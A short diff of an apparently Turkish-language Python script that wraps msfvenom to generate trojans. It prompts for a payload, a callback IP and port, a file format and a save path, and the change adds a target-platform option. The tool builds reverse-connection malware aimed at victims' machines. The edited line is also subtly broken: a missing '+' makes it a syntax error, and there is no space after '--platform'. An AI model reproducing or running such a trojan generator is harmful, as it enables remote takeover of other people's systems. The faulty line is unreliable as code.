@@ -26,7 +26,9 @@ dosya = input("İşletim sistemine göre dosya türü: ")
 
 kayit = input("Trojanın kayıt edileceği konum: ")
 
-os.system("msfvenom -p " + payload + " LHOST=" + ip + " LPORT=" + port + " -f " + dosya + " -O" + kayit)
+platform = input("İşletim sistemi: ")
+
+os.system("msfvenom -p " + payload + " LHOST=" + ip + " LPORT=" + port + " -f " + dosya + " --platform" + platform " -o" + kayit)
 
 restart = input("Yeni trojan oluşturmak istermisiniz? (E/h): ")
 
